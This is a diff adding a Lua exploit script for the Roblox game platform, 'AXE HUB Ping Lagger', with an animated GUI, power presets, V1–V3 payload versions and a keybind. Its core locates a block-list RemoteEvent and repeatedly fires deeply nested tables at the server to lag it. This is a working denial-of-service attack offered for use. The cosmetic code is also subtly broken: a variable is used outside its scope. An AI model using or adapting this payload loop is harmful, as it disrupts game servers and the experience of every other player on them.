@@ -1,0 +1,818 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local plr = Players.LocalPlayer
+local playerGui = plr:WaitForChild("PlayerGui")
+
+-- 🎨 نظام الألوان (أصفر إشعاعي متحرك + تباين عالي)
+local C = {
+	bg = Color3.fromRGB(8, 8, 10),
+	card = Color3.fromRGB(18, 18, 24),
+	accent = Color3.fromRGB(255, 200, 30),
+	accentDim = Color3.fromRGB(180, 140, 20),
+	accentLit = Color3.fromRGB(255, 235, 130),
+	glow = Color3.fromRGB(255, 210, 60),
+	text = Color3.fromRGB(255, 255, 255),
+	muted = Color3.fromRGB(140, 140, 150),
+	on = Color3.fromRGB(50, 220, 140),
+	off = Color3.fromRGB(220, 70, 80),
+	white = Color3.fromRGB(255, 255, 255),
+	stroke = Color3.fromRGB(255, 200, 30),
+}
+
+local CONFIG_FILE = "AXEHUB_PingLagger_Config.json"
+local PRESETS = {["S.Low"]=10000, Low=25000, Mid=50000, High=80000}
+local PRESET_ORDER = {"S.Low","Low","Mid","High"}
+local cfg = {power=50000, preset="Mid", interval=0.125, keybind="F", autoBrainrot=true, version=2}
+
+local function resolveKey(name)
+	if not name or name=="" or name=="None" then return nil end
+	local ok, val = pcall(function() return Enum.KeyCode[name] end)
+	return (ok and val) or nil
+end
+
+local function saveConfig()
+	local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
+	if ok and encoded and writefile then pcall(writefile, CONFIG_FILE, encoded) end
+end
+
+local function loadConfig()
+	if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
+	local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
+	if not ok or type(data)~="table" then return end
+	cfg.power = tonumber(data.power) or cfg.power
+	cfg.preset = type(data.preset)=="string" and data.preset or cfg.preset
+	cfg.interval = tonumber(data.interval) or cfg.interval
+	cfg.keybind = type(data.keybind)=="string" and data.keybind or cfg.keybind
+	cfg.autoBrainrot = type(data.autoBrainrot)=="boolean" and data.autoBrainrot or cfg.autoBrainrot
+	cfg.version = tonumber(data.version) or 2
+	if PRESETS[cfg.preset] then cfg.power = PRESETS[cfg.preset] end
+end
+loadConfig()
+
+local active, listeningFor, remote, uiLocked, settingsOpen = false, false, nil, false, false
+
+local function findRemote()
+	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+	if not rrs then return nil end
+	local rem
+	for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
+		local r = rrs:FindFirstChild(name)
+		if r and r:IsA("RemoteEvent") then rem=r break end
+	end
+	if not rem then
+		for _, c in ipairs(rrs:GetChildren()) do
+			if c:IsA("RemoteEvent") and c.Name:find("Block") then rem=c break end
+		end
+	end
+	return rem
+end
+remote = findRemote()
+
+-- 🔄 منطق الإصدارات (V1 / V2 / V3)
+local function buildPayload(power)
+	local version = cfg.version or 2
+	local safePower = tonumber(power) or 50000
+	if safePower < 1 then safePower = 1 end
+	
+	if version == 1 then
+		local main = {}
+		local chunk = {}
+		for _ = 1, 100 do table.insert(chunk, {}) end
+		local maxRep = math.min(math.floor(safePower / 100), 10000)
+		for _ = 1, maxRep do table.insert(main, chunk) end
+		return main
+	elseif version == 2 then
+		local main = {}
+		local nested = {{}}
+		local current = nested[1]
+		for _ = 1, 186 do
+			local n = {}
+			table.insert(current, n)
+			current = n
+		end
+		local maxRep = math.min(math.floor(safePower / 188), 10000)
+		for _ = 1, maxRep do table.insert(main, nested) end
+		return main
+	elseif version == 3 then
+		local main = {}
+		local nested = {{}}
+		local current = nested[1]
+		for _ = 1, 186 do
+			local n = {}
+			table.insert(current, n)
+			current = n
+		end
+		local maxRep = math.min(math.floor(safePower / 188), 10000)
+		if maxRep < 1 then maxRep = 1 end
+		for _ = 1, maxRep do
+			table.insert(main, nested)
+		end
+		return main
+	end
+end
+
+local loopTask = nil
+local function setLag(state)
+	active = state
+	if active then
+		if not remote or not remote.Parent then remote = findRemote() end
+		if loopTask then pcall(task.cancel, loopTask) end
+		loopTask = task.spawn(function()
+			local currentDelay = cfg.interval
+			while active do
+				if not remote or not remote.Parent then
+					remote = findRemote()
+					if not remote then task.wait(0.5) continue end
+				end
+				local payload = buildPayload(cfg.power)
+				local ok = pcall(function() remote:FireServer(payload) end)
+				if not ok then currentDelay = math.min(currentDelay*1.5, 0.5)
+				else currentDelay = math.max(currentDelay*0.995, 0.05) end
+				task.wait(currentDelay)
+			end
+		end)
+	else
+		if loopTask then pcall(task.cancel, loopTask) end
+		loopTask = nil
+	end
+end
+
+local function corner(parent, r)
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, r or 8)
+	c.Parent = parent
+	return c
+end
+
+local function stroke(parent, color, thick, trans)
+	local s = Instance.new("UIStroke")
+	s.Color = color or C.stroke
+	s.Thickness = thick or 1.5
+	s.Transparency = trans or 0.4
+	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	s.Parent = parent
+	return s
+end
+
+-- 🖥️ الشاشة الرئيسية
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "AXEHUB_PingLagger"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.IgnoreGuiInset = true
+pcall(function() screenGui.Parent = game:GetService("CoreGui") end)
+if not screenGui.Parent then screenGui.Parent = playerGui end
+
+-- 🌌 شاشة الانترو الكاملة (Full Screen)
+local modeSelector = Instance.new("Frame")
+modeSelector.Size = UDim2.new(1, 0, 1, 0)
+modeSelector.BackgroundColor3 = C.bg
+modeSelector.BorderSizePixel = 0
+modeSelector.ZIndex = 100
+modeSelector.Parent = screenGui
+
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 10, 14)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 8))
+}
+gradient.Rotation = 90
+gradient.Parent = modeSelector
+
+-- ✨ تأثيرات كونية نازلة (Falling Cosmic Effects)
+local cosmicContainer = Instance.new("Frame")
+cosmicContainer.Size = UDim2.new(1, 0, 1, 0)
+cosmicContainer.BackgroundTransparency = 1
+cosmicContainer.ClipsDescendants = true
+cosmicContainer.ZIndex = 101
+cosmicContainer.Parent = modeSelector
+
+local cosmicPool = {}
+for _ = 1, 60 do
+	local s = Instance.new("Frame")
+	s.Size = UDim2.new(0, 0, 0, 0)
+	s.BackgroundColor3 = C.accentLit
+	s.BorderSizePixel = 0
+	s.BackgroundTransparency = 1
+	s.ZIndex = 102
+	s.Parent = cosmicContainer
+	corner(s, 50)
+	local sStroke = stroke(s, C.glow, 1, 0.2)
+	table.insert(cosmicPool, s)
+end
+
+local function emitCosmic()
+	local s = table.remove(cosmicPool, 1)
+	if not s then return end
+	local sx = math.random(0, 100)
+	local size = math.random(4, 12)
+	s.Position = UDim2.new(sx, 0, 0, -20)
+	s.Size = UDim2.new(0, size, 0, size)
+	s.BackgroundTransparency = 0
+	sStroke.Transparency = 0
+	
+	local duration = math.random(20, 40) / 10
+	TweenService:Create(s, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
+		Position = UDim2.new(sx + math.random(-10, 10), 0, 1, 20),
+		BackgroundTransparency = 1
+	}):Play()
+	TweenService:Create(sStroke, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
+		Transparency = 1
+	}):Play()
+	
+	task.delay(duration, function()
+		table.insert(cosmicPool, s)
+	end)
+end
+
+task.spawn(function()
+	while true do
+		task.wait(0.08)
+		if modeSelector.Parent then emitCosmic() end
+	end
+end)
+
+-- شعار AXE HUB النابض
+local logoText = Instance.new("TextLabel")
+logoText.Size = UDim2.new(1, 0, 0, 60)
+logoText.Position = UDim2.new(0, 0, 0.25, 0)
+logoText.BackgroundTransparency = 1
+logoText.Text = "AXE HUB"
+logoText.TextColor3 = C.accent
+logoText.TextSize = 42
+logoText.Font = Enum.Font.GothamBlack
+logoText.TextXAlignment = Enum.TextXAlignment.Center
+logoText.ZIndex = 110
+logoText.Parent = modeSelector
+
+local logoStroke = stroke(logoText, C.glow, 2, 0.3)
+logoStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
+
+task.spawn(function()
+	while true do
+		TweenService:Create(logoText, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextTransparency = 0.1}):Play()
+		TweenService:Create(logoStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.1}):Play()
+		task.wait(1.5)
+		TweenService:Create(logoText, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextTransparency = 0}):Play()
+		TweenService:Create(logoStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.3}):Play()
+		task.wait(1.5)
+	end
+end)
+
+local subTitle = Instance.new("TextLabel")
+subTitle.Size = UDim2.new(1, 0, 0, 30)
+subTitle.Position = UDim2.new(0, 0, 0.33, 0)
+subTitle.BackgroundTransparency = 1
+subTitle.Text = "SELECT YOUR PLATFORM"
+subTitle.TextColor3 = C.muted
+subTitle.TextSize = 14
+subTitle.Font = Enum.Font.GothamBold
+subTitle.TextXAlignment = Enum.TextXAlignment.Center
+subTitle.ZIndex = 110
+subTitle.Parent = modeSelector
+
+-- أزرار الاختيار (دخول متتابع احترافي)
+local btnFrame = Instance.new("Frame")
+btnFrame.Size = UDim2.new(0, 340, 0, 60)
+btnFrame.Position = UDim2.new(0.5, -170, 0.45, 0)
+btnFrame.BackgroundTransparency = 1
+btnFrame.ZIndex = 110
+btnFrame.Parent = modeSelector
+
+local mobBtn = Instance.new("TextButton")
+mobBtn.Size = UDim2.new(0, 150, 0, 55)
+mobBtn.Position = UDim2.new(0.5, -80, 0.5, 0)
+mobBtn.AnchorPoint = Vector2.new(0.5, 0.5)
+mobBtn.BackgroundColor3 = C.card
+mobBtn.Text = "📱 Mobile"
+mobBtn.TextColor3 = C.accent
+mobBtn.TextSize = 16
+mobBtn.Font = Enum.Font.GothamBold
+mobBtn.ZIndex = 111
+mobBtn.Parent = btnFrame
+mobBtn.BackgroundTransparency = 1
+mobBtn.TextTransparency = 1
+local mobScale = Instance.new("UIScale", mobBtn)
+mobScale.Scale = 0.8
+corner(mobBtn, 10)
+stroke(mobBtn, C.stroke, 1.5, 0.5)
+
+local pcBtn = Instance.new("TextButton")
+pcBtn.Size = UDim2.new(0, 150, 0, 55)
+pcBtn.Position = UDim2.new(0.5, 80, 0.5, 0)
+pcBtn.AnchorPoint = Vector2.new(0.5, 0.5)
+pcBtn.BackgroundColor3 = C.card
+pcBtn.Text = "💻 PC Control"
+pcBtn.TextColor3 = C.accent
+pcBtn.TextSize = 16
+pcBtn.Font = Enum.Font.GothamBold
+pcBtn.ZIndex = 111
+pcBtn.Parent = btnFrame
+pcBtn.BackgroundTransparency = 1
+pcBtn.TextTransparency = 1
+local pcScale = Instance.new("UIScale", pcBtn)
+pcScale.Scale = 0.8
+corner(pcBtn, 10)
+stroke(pcBtn, C.stroke, 1.5, 0.5)
+
+task.spawn(function()
+	task.wait(0.3)
+	TweenService:Create(mobBtn, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
+	TweenService:Create(mobScale, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
+	
+	task.wait(0.25)
+	TweenService:Create(pcBtn, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
+	TweenService:Create(pcScale, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
+end)
+
+-- 🖼️ الواجهة الرئيسية (Main Frame)
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 190)
+frame.Position = UDim2.new(0.5, -150, 0.5, -95)
+frame.BackgroundColor3 = C.card
+frame.BackgroundTransparency = 0.15
+frame.BorderSizePixel = 0
+frame.Visible = false
+frame.ZIndex = 50
+frame.Parent = screenGui
+corner(frame, 14)
+stroke(frame, C.accent, 2, 0.3)
+
+local topBar = Instance.new("Frame")
+topBar.Size = UDim2.new(1, 0, 0, 38)
+topBar.BackgroundColor3 = C.bg
+topBar.BackgroundTransparency = 0.3
+topBar.BorderSizePixel = 0
+topBar.Parent = frame
+corner(topBar, 14)
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -70, 1, 0)
+title.Position = UDim2.new(0, 14, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "AXE HUB | PING LAGGER"
+title.TextColor3 = C.accentLit
+title.TextSize = 14
+title.Font = Enum.Font.GothamBlack
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.ZIndex = 55
+title.Parent = topBar
+
+local lockBtn = Instance.new("TextButton")
+lockBtn.Size = UDim2.new(0, 26, 0, 26)
+lockBtn.Position = UDim2.new(1, -32, 0, 6)
+lockBtn.BackgroundColor3 = C.card
+lockBtn.Text = "🔓"
+lockBtn.TextColor3 = C.white
+lockBtn.TextSize = 13
+lockBtn.Font = Enum.Font.GothamBold
+lockBtn.ZIndex = 56
+lockBtn.Parent = topBar
+corner(lockBtn, 6)
+stroke(lockBtn, C.stroke, 1, 0.5)
+
+local gearBtn = Instance.new("TextButton")
+gearBtn.Size = UDim2.new(0, 26, 0, 26)
+gearBtn.Position = UDim2.new(1, -62, 0, 6)
+gearBtn.BackgroundColor3 = C.card
+gearBtn.Text = "⚙"
+gearBtn.TextColor3 = C.accent
+gearBtn.TextSize = 15
+gearBtn.Font = Enum.Font.GothamBold
+gearBtn.ZIndex = 56
+gearBtn.Parent = topBar
+corner(gearBtn, 6)
+stroke(gearBtn, C.stroke, 1, 0.5)
+
+local lagBtn = Instance.new("TextButton")
+lagBtn.Size = UDim2.new(0, 250, 0, 44)
+lagBtn.Position = UDim2.new(0.5, -125, 0, 50)
+lagBtn.BackgroundColor3 = C.card
+lagBtn.BorderSizePixel = 0
+lagBtn.Text = "ACTIVATE"
+lagBtn.TextColor3 = C.accent
+lagBtn.TextSize = 18
+lagBtn.Font = Enum.Font.GothamBlack
+lagBtn.ZIndex = 55
+lagBtn.Parent = frame
+corner(lagBtn, 10)
+stroke(lagBtn, C.accent, 1.5, 0.3)
+
+local presetRow = Instance.new("Frame")
+presetRow.Size = UDim2.new(0, 250, 0, 34)
+presetRow.Position = UDim2.new(0.5, -125, 0, 105)
+presetRow.BackgroundTransparency = 1
+presetRow.ZIndex = 55
+presetRow.Parent = frame
+
+local presetLayout = Instance.new("UIListLayout")
+presetLayout.FillDirection = Enum.FillDirection.Horizontal
+presetLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+presetLayout.Padding = UDim.new(0, 6)
+presetLayout.SortOrder = Enum.SortOrder.LayoutOrder
+presetLayout.Parent = presetRow
+
+local presetButtons = {}
+local function updatePresetVisuals()
+	for name, btn in pairs(presetButtons) do
+		local selected = (cfg.preset == name)
+		btn.BackgroundColor3 = selected and C.accent or C.card
+		btn.TextColor3 = selected and C.bg or C.muted
+		local s = btn:FindFirstChildOfClass("UIStroke")
+		if s then s.Transparency = selected and 0.1 or 0.6 end
+	end
+end
+
+local function setPreset(name)
+	if not PRESETS[name] then return end
+	cfg.preset = name
+	cfg.power = PRESETS[name]
+	if active then setLag(false); setLag(true) end
+	saveConfig()
+	updatePresetVisuals()
+end
+
+for i, name in ipairs(PRESET_ORDER) do
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(0, 56, 0, 30)
+	btn.BackgroundColor3 = C.card
+	btn.BorderSizePixel = 0
+	btn.Text = name
+	btn.TextColor3 = C.muted
+	btn.TextSize = 12
+	btn.Font = Enum.Font.GothamBold
+	btn.LayoutOrder = i
+	btn.ZIndex = 56
+	btn.Parent = presetRow
+	corner(btn, 8)
+	stroke(btn, C.stroke, 1, 0.6)
+	btn.MouseButton1Click:Connect(function() setPreset(name) end)
+	presetButtons[name] = btn
+end
+updatePresetVisuals()
+
+-- ⚙️ لوحة الإعدادات المطورة (مربعة، قابلة للسحب، ناعمة)
+local settingsFrame = Instance.new("Frame")
+settingsFrame.Size = UDim2.new(0, 260, 0, 230)
+settingsFrame.Position = UDim2.new(0.5, -130, 0.5, -105)
+settingsFrame.BackgroundColor3 = C.bg
+settingsFrame.BackgroundTransparency = 0.15
+settingsFrame.BorderSizePixel = 0
+settingsFrame.Visible = false
+settingsFrame.ZIndex = 60
+settingsFrame.Parent = screenGui
+corner(settingsFrame, 12)
+stroke(settingsFrame, C.accent, 1.5, 0.3)
+
+local function makeDraggable(target, lockedCheck)
+	local dragging, dragStart, startAbs
+	target.InputBegan:Connect(function(input)
+		if lockedCheck and lockedCheck() then return end
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startAbs = target.AbsolutePosition
+		end
+	end)
+	UserInputService.InputChanged:Connect(function(input)
+		if not dragging then return end
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			local delta = input.Position - dragStart
+			local vp = workspace.CurrentCamera.ViewportSize
+			local nx = math.clamp(startAbs.X + delta.X, -target.AbsoluteSize.X + 40, vp.X - 40)
+			local ny = math.clamp(startAbs.Y + delta.Y, 0, vp.Y - target.AbsoluteSize.Y)
+			target.Position = UDim2.new(0, nx, 0, ny)
+		end
+	end)
+	UserInputService.InputEnded:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = false
+		end
+	end)
+end
+makeDraggable(settingsFrame, function() return uiLocked end)
+
+local setHeader = Instance.new("Frame")
+setHeader.Size = UDim2.new(1, 0, 0, 36)
+setHeader.BackgroundColor3 = C.card
+setHeader.BackgroundTransparency = 0.3
+setHeader.BorderSizePixel = 0
+setHeader.Parent = settingsFrame
+corner(setHeader, 12)
+
+local setTitle = Instance.new("TextLabel")
+setTitle.Size = UDim2.new(1, -40, 1, 0)
+setTitle.Position = UDim2.new(0, 12, 0, 0)
+setTitle.BackgroundTransparency = 1
+setTitle.Text = "⚙ SETTINGS"
+setTitle.TextColor3 = C.accentLit
+setTitle.TextSize = 13
+setTitle.Font = Enum.Font.GothamBlack
+setTitle.TextXAlignment = Enum.TextXAlignment.Left
+setTitle.ZIndex = 65
+setTitle.Parent = setHeader
+
+local closeSetBtn = Instance.new("TextButton")
+closeSetBtn.Size = UDim2.new(0, 28, 0, 28)
+closeSetBtn.Position = UDim2.new(1, -32, 0, 4)
+closeSetBtn.BackgroundColor3 = C.card
+closeSetBtn.Text = "✕"
+closeSetBtn.TextColor3 = C.muted
+closeSetBtn.TextSize = 14
+closeSetBtn.Font = Enum.Font.GothamBold
+closeSetBtn.ZIndex = 65
+closeSetBtn.Parent = setHeader
+corner(closeSetBtn, 6)
+
+-- Version Selector (V1 / V2 / V3)
+local verRow = Instance.new("Frame")
+verRow.Size = UDim2.new(1, -20, 0, 30)
+verRow.Position = UDim2.new(0, 10, 0, 45)
+verRow.BackgroundTransparency = 1
+verRow.ZIndex = 65
+verRow.Parent = settingsFrame
+
+local verLayout = Instance.new("UIListLayout")
+verLayout.FillDirection = Enum.FillDirection.Horizontal
+verLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+verLayout.Padding = UDim.new(0, 6)
+verLayout.Parent = verRow
+
+local verButtons = {}
+local function updateVerVisuals()
+	for v, btn in pairs(verButtons) do
+		local selected = (cfg.version == v)
+		btn.BackgroundColor3 = selected and C.accent or C.card
+		btn.TextColor3 = selected and C.bg or C.muted
+		local s = btn:FindFirstChildOfClass("UIStroke")
+		if s then s.Transparency = selected and 0.1 or 0.6 end
+	end
+end
+
+for _, v in ipairs({1, 2, 3}) do
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(0, 70, 0, 28)
+	btn.BackgroundColor3 = C.card
+	btn.BorderSizePixel = 0
+	btn.Text = "V" .. v
+	btn.TextColor3 = C.muted
+	btn.TextSize = 12
+	btn.Font = Enum.Font.GothamBold
+	btn.ZIndex = 66
+	btn.Parent = verRow
+	corner(btn, 6)
+	stroke(btn, C.stroke, 1, 0.6)
+	btn.MouseButton1Click:Connect(function()
+		cfg.version = v
+		saveConfig()
+		updateVerVisuals()
+		if active then setLag(false); setLag(true) end
+	end)
+	verButtons[v] = btn
+end
+updateVerVisuals()
+
+local function makeSettingRow(parent, label, y, defaultText, callback)
+	local row = Instance.new("Frame")
+	row.Size = UDim2.new(1, -20, 0, 32)
+	row.Position = UDim2.new(0, 10, 0, y)
+	row.BackgroundTransparency = 1
+	row.ZIndex = 65
+	row.Parent = parent
+
+	local lbl = Instance.new("TextLabel")
+	lbl.Size = UDim2.new(0, 60, 1, 0)
+	lbl.BackgroundTransparency = 1
+	lbl.Text = label
+	lbl.TextColor3 = C.accentLit
+	lbl.TextSize = 11
+	lbl.Font = Enum.Font.GothamBold
+	lbl.TextXAlignment = Enum.TextXAlignment.Left
+	lbl.ZIndex = 66
+	lbl.Parent = row
+
+	local box = Instance.new("TextBox")
+	box.Size = UDim2.new(1, -70, 0, 26)
+	box.Position = UDim2.new(0, 70, 0.5, -13)
+	box.BackgroundColor3 = C.card
+	box.BackgroundTransparency = 0.3
+	box.TextColor3 = C.white
+	box.TextSize = 12
+	box.Font = Enum.Font.GothamBold
+	box.Text = defaultText
+	box.ClearTextOnFocus = false
+	box.ZIndex = 66
+	box.Parent = row
+	corner(box, 6)
+	stroke(box, C.stroke, 1, 0.5)
+
+	box.FocusLost:Connect(function() callback(box.Text) end)
+	return box
+end
+
+local powerBox = makeSettingRow(settingsFrame, "POWER", 80, tostring(cfg.power), function(text)
+	local num = tonumber(text)
+	if num and num >= 1 then
+		cfg.power = math.floor(num)
+		saveConfig()
+		if active then setLag(false); setLag(true) end
+	end
+end)
+
+local delayBox = makeSettingRow(settingsFrame, "DELAY", 118, tostring(cfg.interval), function(text)
+	local num = tonumber(text)
+	if num and num >= 0.01 then
+		cfg.interval = num
+		saveConfig()
+		if active then setLag(false); setLag(true) end
+	end
+end)
+
+local kbRow = Instance.new("Frame")
+kbRow.Size = UDim2.new(1, -20, 0, 32)
+kbRow.Position = UDim2.new(0, 10, 0, 156)
+kbRow.BackgroundTransparency = 1
+kbRow.ZIndex = 65
+kbRow.Parent = settingsFrame
+
+local kbLbl = Instance.new("TextLabel")
+kbLbl.Size = UDim2.new(0, 60, 1, 0)
+kbLbl.BackgroundTransparency = 1
+kbLbl.Text = "KEY"
+kbLbl.TextColor3 = C.accentLit
+kbLbl.TextSize = 11
+kbLbl.Font = Enum.Font.GothamBold
+kbLbl.TextXAlignment = Enum.TextXAlignment.Left
+kbLbl.ZIndex = 66
+kbLbl.Parent = kbRow
+
+local kbBtn = Instance.new("TextButton")
+kbBtn.Size = UDim2.new(1, -70, 0, 26)
+kbBtn.Position = UDim2.new(0, 70, 0.5, -13)
+kbBtn.BackgroundColor3 = C.card
+kbBtn.BackgroundTransparency = 0.3
+kbBtn.Text = cfg.keybind
+kbBtn.TextColor3 = C.accent
+kbBtn.TextSize = 12
+kbBtn.Font = Enum.Font.GothamBold
+kbBtn.ZIndex = 66
+kbBtn.Parent = kbRow
+corner(kbBtn, 6)
+stroke(kbBtn, C.stroke, 1, 0.5)
+
+kbBtn.MouseButton1Click:Connect(function()
+	listeningFor = true
+	kbBtn.Text = "..."
+	kbBtn.TextColor3 = C.glow
+end)
+
+local autoRow = Instance.new("Frame")
+autoRow.Size = UDim2.new(1, -20, 0, 32)
+autoRow.Position = UDim2.new(0, 10, 0, 190)
+autoRow.BackgroundTransparency = 1
+autoRow.ZIndex = 65
+autoRow.Parent = settingsFrame
+
+local autoLbl = Instance.new("TextLabel")
+autoLbl.Size = UDim2.new(0, 80, 1, 0)
+autoLbl.BackgroundTransparency = 1
+autoLbl.Text = "AUTO ACT"
+autoLbl.TextColor3 = C.accentLit
+autoLbl.TextSize = 11
+autoLbl.Font = Enum.Font.GothamBold
+autoLbl.TextXAlignment = Enum.TextXAlignment.Left
+autoLbl.ZIndex = 66
+autoLbl.Parent = autoRow
+
+local toggleTrack = Instance.new("Frame")
+toggleTrack.Size = UDim2.new(0, 44, 0, 22)
+toggleTrack.Position = UDim2.new(0, 70, 0.5, -11)
+toggleTrack.BackgroundColor3 = cfg.autoBrainrot and C.accent or C.card
+toggleTrack.BorderSizePixel = 0
+toggleTrack.ZIndex = 66
+toggleTrack.Parent = autoRow
+corner(toggleTrack, 11)
+stroke(toggleTrack, C.stroke, 1, 0.4)
+
+local toggleKnob = Instance.new("Frame")
+toggleKnob.Size = UDim2.new(0, 16, 0, 16)
+toggleKnob.Position = cfg.autoBrainrot and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
+toggleKnob.BackgroundColor3 = C.white
+toggleKnob.BorderSizePixel = 0
+toggleKnob.ZIndex = 67
+toggleKnob.Parent = toggleTrack
+corner(toggleKnob, 8)
+
+local toggleHit = Instance.new("TextButton")
+toggleHit.Size = UDim2.new(1, 0, 1, 0)
+toggleHit.BackgroundTransparency = 1
+toggleHit.Text = ""
+toggleHit.ZIndex = 68
+toggleHit.Parent = toggleTrack
+
+toggleHit.MouseButton1Click:Connect(function()
+	cfg.autoBrainrot = not cfg.autoBrainrot
+	local goalPos = cfg.autoBrainrot and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
+	local goalColor = cfg.autoBrainrot and C.accent or C.card
+	TweenService:Create(toggleKnob, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Position = goalPos}):Play()
+	TweenService:Create(toggleTrack, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {BackgroundColor3 = goalColor}):Play()
+	saveConfig()
+end)
+
+-- 🖱️ نظام السحب للواجهة الرئيسية
+makeDraggable(frame, function() return uiLocked end)
+
+-- التفاعلات الرئيسية
+lagBtn.MouseButton1Click:Connect(function()
+	active = not active
+	setLag(active)
+	lagBtn.Text = active and "DEACTIVATE" or "ACTIVATE"
+	lagBtn.TextColor3 = active and C.on or C.accent
+	if active then
+		TweenService:Create(lagBtn, TweenInfo.new(0.3), {BackgroundColor3 = C.on, TextColor3 = C.white}):Play()
+	else
+		TweenService:Create(lagBtn, TweenInfo.new(0.3), {BackgroundColor3 = C.card, TextColor3 = C.accent}):Play()
+	end
+end)
+
+lockBtn.MouseButton1Click:Connect(function()
+	uiLocked = not uiLocked
+	lockBtn.Text = uiLocked and "🔒" or "🔓"
+	lockBtn.TextColor3 = uiLocked and C.off or C.white
+end)
+
+local function toggleSettings()
+	settingsOpen = not settingsOpen
+	if settingsOpen then
+		settingsFrame.Visible = true
+		settingsFrame.BackgroundTransparency = 1
+		settingsFrame.Position = UDim2.new(0.5, -130, 0.5, -80)
+		TweenService:Create(settingsFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
+			BackgroundTransparency = 0.15,
+			Position = UDim2.new(0.5, -130, 0.5, -105)
+		}):Play()
+		lagBtn.Visible = false
+		presetRow.Visible = false
+	else
+		TweenService:Create(settingsFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+			BackgroundTransparency = 1,
+			Position = UDim2.new(0.5, -130, 0.5, -80)
+		}):Play()
+		task.delay(0.2, function()
+			settingsFrame.Visible = false
+			lagBtn.Visible = true
+			presetRow.Visible = true
+		end)
+	end
+end
+
+gearBtn.MouseButton1Click:Connect(toggleSettings)
+closeSetBtn.MouseButton1Click:Connect(toggleSettings)
+
+UserInputService.InputBegan:Connect(function(input, processed)
+	local kc = input.KeyCode
+	if kc == Enum.KeyCode.Unknown then return end
+	if listeningFor then
+		if kc == Enum.KeyCode.Escape then 
+			listeningFor = false; kbBtn.Text = cfg.keybind; kbBtn.TextColor3 = C.accent; return 
+		end
+		if kc ~= Enum.KeyCode.LeftControl then 
+			cfg.keybind = kc.Name; listeningFor = false; kbBtn.Text = cfg.keybind; kbBtn.TextColor3 = C.accent; saveConfig() 
+		end
+		return
+	end
+	if processed then return end
+	local keyEnum = resolveKey(cfg.keybind)
+	if keyEnum and kc == keyEnum then 
+		active = not active; setLag(active)
+		lagBtn.Text = active and "DEACTIVATE" or "ACTIVATE"
+		lagBtn.TextColor3 = active and C.on or C.accent
+		if active then
+			TweenService:Create(lagBtn, TweenInfo.new(0.3), {BackgroundColor3 = C.on, TextColor3 = C.white}):Play()
+		else
+			TweenService:Create(lagBtn, TweenInfo.new(0.3), {BackgroundColor3 = C.card, TextColor3 = C.accent}):Play()
+		end
+	end
+end)
+
+-- فتح الواجهة الرئيسية
+local function openMain()
+	TweenService:Create(modeSelector, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
+	task.delay(0.4, function()
+		modeSelector.Visible = false
+		frame.Visible = true
+		frame.BackgroundTransparency = 1
+		frame.Position = UDim2.new(0.5, -150, 0.6, 0)
+		TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
+			BackgroundTransparency = 0.15,
+			Position = UDim2.new(0.5, -150, 0.5, -95)
+		}):Play()
+	end)
+end
+
+mobBtn.MouseButton1Click:Connect(openMain)
+pcBtn.MouseButton1Click:Connect(openMain)
